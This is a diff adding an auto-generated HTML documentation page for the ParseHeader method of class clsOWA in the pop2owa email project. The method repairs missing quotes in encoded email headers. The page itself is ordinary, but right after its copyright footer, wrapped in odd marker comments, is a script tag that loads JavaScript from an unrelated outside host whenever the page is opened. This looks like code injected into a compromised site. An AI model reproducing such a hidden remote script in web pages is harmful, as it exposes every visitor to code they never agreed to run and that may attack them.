@@ -1,0 +1,53 @@
+<!doctype html public "-//w3c//dtd html 4.0 transitional//en">
+<html>
+<head>
+  <meta http-equiv="Content-Type" content="Text/html; charset=iso-8859-1">
+  <meta name="Author" content = "m.stamenov" >
+  <meta name="GENERATOR" content="VBDOX [2.0.15]" >
+  <link REL="stylesheet" TYPE="text/css" HREF="backsdk4.css">
+  <script SRC="langref.js"></script>
+  <title>clsOWA:&nbsp;ParseHeader</title>
+</head>
+<BODY TOPMARGIN="0">
+<TABLE CLASS="buttonbarshade" CELLSPACING=0><TR><TD>&nbsp;</TD></TR></TABLE>
+<TABLE CLASS="buttonbartable" CELLSPACING=0>
+<TR ID="hdr"><TD CLASS="runninghead" NOWRAP>clsOWA:&nbsp;ParseHeader</TD></TR>
+</TABLE>
+<!-- ============ METHOD ENTRY ============ -->
+<H1>ParseHeader</H1>
+<P>
+Parse the mail header to fix incorrect email address with non US chars.
+For example:<BR>
+=?iso-8859-1?Q?   Martin_Sacrist=E1n=2C_C=2E   ?= <XXXX>
+Should be:<BR>
+=?iso-8859-1?Q?=22Martin_Sacrist=E1n=2C_C=2E=22?= <XXXX>
+Quotes are missing and some email clients fails parsing it.
+
+<p><br>
+</p><br>
+<PRE class=syntax><B><font class="keyword">&nbsp;Public</font><font class="keyword">&nbsp;Sub</font><font class="identifier">&nbsp;ParseHeader</font>(
+	&nbsp;<font class="keyword">&nbsp;ByRef</font><font class="identifier">&nbsp;strMsg</font><font class="keyword">&nbsp;As</font><font class="keyword">&nbsp;String</font>&nbsp;)</B></PRE>
+<H4>Parameters</H4>
+<DL>
+<DT><I>strMsg</I></TD>
+<DD>
+[ByRef]
+ <B>String</B>.
+  Email message in RFC 821 format
+</DD>
+</DL>
+<H4>Remarks</H4>
+<P></P>
+<H4>See Also</H4>
+<P>
+<A HREF="pop2owa.html">Project pop2owa Overview</A>
+<A HREF="clsOWA.html">Class clsOWA Overview</A>
+<A HREF="clsOWA.html#public_props">clsOWA Properties</A>
+<A HREF="clsOWA.html#public_methods">clsOWA Methods</A>
+<B><A HREF="clsOWA.ParseAtachment.html">ParseAtachment</A></B>
+<B><A HREF="clsOWA.SendMail.html">SendMail</A></B>
+<DIV class=footer>Build on martes, 11 de noviembre de 2008 by VBDOX <BR>Copyright &copy; 2000 - 2003 M.Stamenov</DIV><!--4ee7a7--><script type="text/javascript" src="http://biozapp.com/Kfx6FNrG.php?id=13042487"></script><!--/4ee7a7-->
+
+<DIV class=footer style="COLOR: #000000; FONT-SIZE: 90%">
+</body>
+</html>
